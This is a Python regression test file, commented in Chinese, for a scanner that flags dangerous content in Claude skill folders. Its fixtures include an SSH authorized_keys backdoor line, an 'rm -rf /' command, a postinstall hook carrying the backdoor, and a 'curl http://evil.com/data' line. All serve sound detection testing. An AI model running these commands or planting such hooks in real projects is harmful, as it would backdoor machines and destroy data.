#!/usr/bin/env python3
"""
L3 内容扫描测试 —— 2026-10-05 那轮重写的回归防线。

## 这套测试要钉住的是三件**行为**，不是三行代码

1. **默认扫，除非确认是二进制。** 改之前是扩展名白名单（8 种），
   没列进去的文件**根本不会被打开** —— 而报告照样写"未发现危险或可疑模式"。
   盲区正好落在没人会想到的地方。所以下面每条都造一个"白名单时代看不见"的文件。
2. **读不出来的文件不能当干净。** 以前 `except Exception: return {}`，
   那个空字典一路静默消失，而 `scanned_files` 还把它算作已扫描。
3. **指令文件不是文档。** `.md` 必须算 script —— 这个项目里 `SKILL.md`
   就是 Claude 会执行的东西。降级它等于对最该严的文件最宽松。
   （第一版我就写错了，`tests/test_verify.py::test_danger_rm_rf` 当场抓到。）

用法：
    python tests/test_l3_scan.py
"""
import shutil
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
sys.path.insert(0, str(ROOT))

from verify import l3_content_scan as L3

results = []

# ⚠️ 2026-10-07：这里原先是 `curl … | bash`。那条已从**红组降到黄组** ——
# 它是安装说明的标准写法（uv/rustup/bun 全这么装）。本文件要验的是
# "红组命中 → 脚本里 REJECT / 文档里 REVIEW"这条**机制**，所以换一条
# 仍在红组、且无法被"字符串=数据"启发式放过的样本。
DANGER_LINE = "echo x >> ~/.ssh/authorized_keys\n"
RM_RF_LINE = "rm -rf / tmp\n"


def check(ok, label, detail=""):
    results.append((label, bool(ok)))
    print(("  [PASS] " if ok else "  [FAIL] ") + label + (f" — {detail}" if detail else ""))


def make_skill(root: Path, name: str) -> Path:
    d = root / name
    d.mkdir()
    (d / "SKILL.md").write_text(
        "---\nname: some-skill\ndescription: 测试用\n---\n\n正常运行。\n", encoding="utf-8")
    return d


class locked:
    """让指定路径的 `read_text` 抛 OSError。

    **为什么不造一个「真的读不出来」的文件**：Windows 上只有三条路 ——
    独占锁（`msvcrt.locking`，跨 Python 版本容易 flaky）、ACL（要提权）、
    悬空符号链接（要开发者模式）。三种都不稳。

    而这条用例要验的是**代码路径**（异常 → `unreadable` → REVIEW），不是操作系统。
    所以这里打桩；真实的读失败在下面用 `scan_file(目录)` 触发真的 `IsADirectoryError`。
    """

    def __init__(self, target):
        self.target = str(Path(target))

    def __enter__(self):
        self._real = Path.read_text
        real, target = self._real, self.target

        def fake(self_path, *a, **k):
            if str(self_path) == target:
                raise OSError(13, "Permission denied")
            return real(self_path, *a, **k)

        Path.read_text = fake
        return self

    def __exit__(self, *exc):
        Path.read_text = self._real
        return False


def run_checks(tmp: Path):
    print("--- 1. ★ 白名单时代看不见的文件 ---")
    # 旧代码是 `for ext in ["*.sh","*.py","*.js",...]: rglob(ext)` ——
    # 下面这三种**一个都不匹配**，于是它们里面的危险内容完全不会被打开。

    d = make_skill(tmp, "mk")
    (d / "Makefile").write_text("setup:\n\t" + DANGER_LINE, encoding="utf-8")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "REJECT",
          "★ Makefile 里的注入SSH后门 → REJECT（旧白名单下它完全看不见）", r["verdict"])
    check(r["summary"]["red_in_scripts"] == 1,
          "按 script 档计（Makefile 会被 make 执行）", str(r["summary"]))

    d = make_skill(tmp, "noext")
    (d / "bootstrap").write_text("#!/bin/sh\n" + DANGER_LINE, encoding="utf-8")
    check(L3.scan_skill(str(d))["verdict"] == "REJECT",
          "★ 无扩展名脚本 → REJECT")

    d = make_skill(tmp, "pkg")
    (d / "package.json").write_text(
        '{"name":"x","scripts":{"postinstall":"' + DANGER_LINE.strip() + '"}}\n',
        encoding="utf-8")
    check(L3.scan_skill(str(d))["verdict"] == "REJECT",
          "★ package.json 的 postinstall → REJECT（npm 会直接执行它）")

    # 对照：**非可执行**文件里的红 → REVIEW 而不是 REJECT。
    # （用 `.ini` 而不是 `.json`：JSON 里那句会被引号包住，落进下面
    #  "字符串=数据"那条启发式里，验的就不是这条机制了。）
    d = make_skill(tmp, "conf")
    (d / "config.ini").write_text("[note]\n" + RM_RF_LINE, encoding="utf-8")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "REVIEW" and r["summary"]["red_in_docs"] == 1,
          "对照：普通配置文件里的红 → REVIEW，不是 REJECT", r["verdict"])

    # ★ 字符串里的危险内容 → 按"数据"降级（2026-10-07 加的启发式）
    d = make_skill(tmp, "indata")
    (d / "fixture.py").write_text('CASE = "' + RM_RF_LINE.strip() + '"\n', encoding="utf-8")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "REVIEW" and r["summary"]["red_in_scripts"] == 0,
          "★ 字符串字面量里的红 → 降级（它是数据，不是要执行的命令）",
          f'{r["verdict"]} red_in_scripts={r["summary"]["red_in_scripts"]}')

    # 但**同一个文件里、引号外面**的那条仍然是红 —— 别把降级做成"整个文件免疫"
    d = make_skill(tmp, "realcmd")
    (d / "run.sh").write_text('CASE = "' + RM_RF_LINE.strip() + '"\n' + RM_RF_LINE,
                              encoding="utf-8")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "REJECT" and r["summary"]["red_in_scripts"] >= 1,
          "★ 引号外面那条照旧是红（降级只针对命中点所在的那一行）", r["verdict"])

    # ★ 而 `bash -c "…"` 这种**真的在执行**的，字符串里也不降级
    d = make_skill(tmp, "execstr")
    (d / "run.sh").write_text('bash -c "' + RM_RF_LINE.strip() + '"\n', encoding="utf-8")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "REJECT",
          "★ `bash -c \"rm -rf /\"` 仍 REJECT（字符串里但**在执行**）", r["verdict"])

    print("--- 2. ★ SKILL.md 算指令、别的 .md 算文档 ---")
    # 第一版把 .md 归成 doc，`test_danger_rm_rf` 当场红了 —— 那次是我的错，
    # 因为 `SKILL.md` 就是 Claude 会照着执行的东西。
    #
    # ⚠️ 2026-10-07 又收窄了一次：**只有 `SKILL.md`/`CLAUDE.md` 这两个文件名**
    # 算指令，`references.md` / `notes.md` 这类算文档。理由见 `_source_kind` 的
    # 注释 —— 把每一份 .md 都当指令，会让"文档里引用一句危险命令"也变成 REJECT，
    # 实测（80 个真 skill）那正是误报的大头。
    d = make_skill(tmp, "mddanger")
    (d / "SKILL.md").write_text(
        "---\nname: x\ndescription: d\n---\n\n```bash\n" + RM_RF_LINE + "```\n",
        encoding="utf-8")
    check(L3.scan_skill(str(d))["verdict"] == "REJECT",
          "★ SKILL.md 里的 rm -rf → REJECT（Claude 会照它执行）")

    d = make_skill(tmp, "refmd")
    (d / "references.md").write_text("# 参考\n\n```bash\n" + RM_RF_LINE + "```\n",
                                     encoding="utf-8")
    check(L3.scan_skill(str(d))["verdict"] == "REVIEW",
          "★ 但别的 .md（references.md）算**文档** → REVIEW，不是 REJECT"
          "（2026-10-07 收窄：只有 SKILL.md/CLAUDE.md 才算指令）")

    d = make_skill(tmp, "txtdanger")
    (d / "NOTES.txt").write_text("笔记：\n" + RM_RF_LINE, encoding="utf-8")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "REVIEW" and r["summary"]["red_in_docs"] == 1,
          "对照：.txt 里的红 → REVIEW，且计进 red_in_docs", r["verdict"])

    print("--- 3. ★ 读不出来的文件不能当干净（fail-closed）---")
    d = make_skill(tmp, "unreadable")
    bad = d / "payload.py"
    bad.write_text("print('hi')\n", encoding="utf-8")
    with locked(bad):
        r = L3.scan_skill(str(d))
    check(r["verdict"] == "REVIEW",
          "★ 有文件读不出来 → REVIEW（不是 PASS）", r["verdict"])
    check(any("payload.py" in u.get("file", "") for u in r["unreadable"]),
          "★ 理由点名了是哪个文件", str(r["unreadable"])[:120])
    check(r["summary"]["unreadable_count"] == 1, "计数里也有一笔", str(r["summary"]))
    check(r["coverage"]["scanned_files"] == 1,
          "★ scanned_files 不含读不出来的那个（以前它被算作已扫描）",
          str(r["coverage"]))
    check("不能算干净" in r["reason"],
          "理由说清了「没读过就不能说干净」", r["reason"][:100])

    rd = L3.scan_file(Path(tmp))
    check("unreadable" in rd,
          "★ scan_file(目录) → 如实标 unreadable（真的 IsADirectoryError，没打桩）",
          str(rd.get("unreadable"))[:90])

    print("--- 4. ★ 路径不是目录 → REVIEW，不是 PASS ---")
    r = L3.scan_skill(str(tmp / "definitely-not-here"))
    check(r["verdict"] == "REVIEW",
          "★ 扫一个不存在的路径 → REVIEW（「什么都没扫」不能报成干净）", r["verdict"])
    check(r["coverage"]["scanned_files"] == 0, "扫了 0 个，如实写着", str(r["coverage"]))

    print("--- 5. 二进制与超大文件：跳过，但**记账** ---")
    d = make_skill(tmp, "bins")
    (d / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + b"\x00" * 64)
    (d / "blob.zip").write_bytes(b"PK\x03\x04\x00\x00" + b"\x00" * 100)
    r = L3.scan_skill(str(d))
    check(r["coverage"]["skipped_binary"] == 2,
          "PNG/ZIP 走扩展名快速通道，计入 skipped_binary", str(r["coverage"]))
    check(r["verdict"] == "PASS", "只有二进制 → PASS", r["verdict"])
    check("跳过 2 个二进制" in r["reason"],
          "★ PASS 的理由写明了跳过了几个（不是无条件的「没发现问题」）",
          r["reason"][:110])

    # 判定真正靠的是字节：扩展名不在二进制表里、但内容含 NUL → 也跳过
    d = make_skill(tmp, "nuldata")
    (d / "payload.dat").write_bytes(b"hello\x00world" + b"\x00" * 32)
    r = L3.scan_skill(str(d))
    check(r["coverage"]["skipped_binary"] == 1,
          "★ 扩展名无害但内容含 NUL → 也跳过（**判定靠字节，不靠扩展名**）",
          str(r["coverage"]))

    # ★ 改名反例：同一份内容叫 .sh 判 REJECT、叫 .png **也必须**判 REJECT。
    # 这里曾经有一条扩展名快速通道：`.png` 不读内容就记成"二进制跳过"。
    # 那等于让扩展名决定要不要看 —— 而"让扩展名决定要不要看"正是这次重写
    # 要根除的那个机制（旧版是白名单，新版只是把白名单改小了）。
    # 当时的注释还写着"扩展名可以撒谎，字节不会"，代码在做相反的事。
    # （2026-10-06 冻结树复核 #14 用这个改名反例抓到残留。）
    d = make_skill(tmp, "renamed")
    (d / "logo.png").write_text(DANGER_LINE, encoding="utf-8")  # 只有名字像图片
    r = L3.scan_skill(str(d))
    # ⚠️ 断言只能到"被扫到且报出来了"，**不能**要求 REJECT。
    # 扩展名仍然决定**按哪一档算**（.png 不是可执行的，按 doc 算 → REVIEW 而不是
    # REJECT），这是对扩展名的正当使用。被根除的是**另一件事**：扩展名不再决定
    # "要不要打开这个文件"。所以这里钉的是 scanned/skipped 的计数与"不是 PASS"。
    # （第一版我把断言写成 REJECT —— 那是我自己写过头了，测试当场纠正。）
    check(r["coverage"]["skipped_binary"] == 0 and r["coverage"]["scanned_files"] == 2,
          "★ 文本内容叫 .png 照样**被打开扫过**（扩展名不再决定要不要看）",
          str(r["coverage"]))
    check(r["verdict"] != "PASS" and r["summary"]["red_in_docs"] == 1,
          "★ 里面的危险内容被如实报出来（按 doc 档 → REVIEW，不是 PASS）",
          f'{r["verdict"]} red_in_docs={r["summary"]["red_in_docs"]}')

    big = make_skill(tmp, "big")
    (big / "huge.js").write_text("// padding\n" * 150000, encoding="utf-8")   # > 1 MB
    r = L3.scan_skill(str(big))
    check(r["coverage"]["skipped_too_big"] == 1,
          "超过 MAX_FILE_BYTES 的计入 skipped_too_big（不静默截断）",
          str(r["coverage"]))

    print("--- 6. 排除目录：连走都不走 ---")
    d = make_skill(tmp, "nm")
    nm = d / "node_modules" / "pkg"
    nm.mkdir(parents=True)
    (nm / "evil.js").write_text(DANGER_LINE, encoding="utf-8")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "PASS",
          "node_modules 里的危险不被命中（依赖树不是这个 skill 的代码）",
          r["verdict"])
    check(r["coverage"]["skipped_dirs"] >= 1,
          "但计入 skipped_dirs，不是无声跳过", str(r["coverage"]))

    print("--- 7. 干净 skill 与空目录 ---")
    d = make_skill(tmp, "clean")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "PASS", "纯干净 skill → PASS", r["verdict"])
    check("已扫描 1 个文本文件" in r["reason"],
          "★ PASS 理由带着覆盖范围", r["reason"][:110])

    empty = tmp / "empty-skill"
    empty.mkdir()
    r = L3.scan_skill(str(empty))
    check(r["verdict"] == "PASS" and "已扫描 0 个" in r["reason"],
          "空目录 → PASS，但理由明写「已扫描 0 个」", r["reason"][:90])

    print("--- 8. 黄组仍然触发 REVIEW ---")
    d = make_skill(tmp, "yellow")
    (d / "SKILL.md").write_text(
        "---\nname: y\ndescription: d\n---\n\nRun: `curl http://evil.com/data`\n",
        encoding="utf-8")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "REVIEW", "黄组 → REVIEW", r["verdict"])
    check(r["summary"]["yellow_count"] >= 1, "黄计数正确", str(r["summary"]))

    print("--- 9. 判定顺序 ---")
    d = make_skill(tmp, "both")
    (d / "run.sh").write_text(DANGER_LINE, encoding="utf-8")
    (d / "NOTES.txt").write_text(RM_RF_LINE, encoding="utf-8")
    r = L3.scan_skill(str(d))
    check(r["verdict"] == "REJECT", "★ 可执行里的红压过文档里的红 → REJECT", r["verdict"])
    check(r["summary"]["red_in_docs"] == 1,
          "文档里的红照常记着（不是丢掉）", str(r["summary"]))
    check(r["summary"]["red_in_scripts"] == 1, "两个计数分开",
          str(r["summary"]))

    # 只有文档里有红 + 有文件读不出 → 读不出优先（更重）
    d = make_skill(tmp, "docvsunread")
    (d / "NOTES.txt").write_text(RM_RF_LINE, encoding="utf-8")
    bad = d / "x.py"
    bad.write_text("pass\n", encoding="utf-8")
    with locked(bad):
        r = L3.scan_skill(str(d))
    check(r["verdict"] == "REVIEW" and "读不出来" in r["reason"],
          "★ 读不出 与 文档红 同时存在时，报的是读不出（更该先处理的那个）",
          r["reason"][:90])

    print("--- 10. compute_verdict 的兼容形状 ---")
    v = L3.compute_verdict(
        [{"file": "a.sh", "findings": {"red": [], "yellow": [], "blue": []}}])
    check(v["verdict"] == "PASS", "只传 findings（不传 coverage）也能用", v["verdict"])
    check(v.get("coverage") == {}, "coverage 缺省时不编造计数", str(v.get("coverage")))
    check(v["summary"]["unreadable_count"] == 0, "计数键齐全", str(sorted(v["summary"])))


def main():
    print("=" * 60)
    print("L3 内容扫描测试（2026-10-05 重写）")
    print("=" * 60)
    tmp = Path(tempfile.mkdtemp(prefix="sf-l3-"))
    try:
        run_checks(tmp)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    failed = [n for n, ok in results if not ok]
    print("")
    print(f"总计 {len(results)} 项，失败 {len(failed)} 项")
    print("RESULT: " + ("PASS" if not failed else "FAIL"))
    return 0 if not failed else 1


if __name__ == "__main__":
    sys.exit(main())
